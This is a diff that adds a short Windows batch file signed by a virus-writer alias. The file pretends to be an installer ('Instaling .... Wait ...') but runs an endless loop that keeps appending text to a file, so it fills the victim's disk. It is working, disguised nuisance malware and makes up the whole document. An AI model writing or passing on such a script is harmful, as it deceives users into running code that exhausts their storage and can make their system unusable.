@@ -1,0 +1,6 @@
+@echo @echo Instaling .... Wait ...
+@echo off
+:loop
+echo Life is a bAtch ... Ratty ... is the 1. >> ≈Ratty≈.txt
+goto loop
+rem This is Bat.Loop_it created by the 1 ... Ratty ...
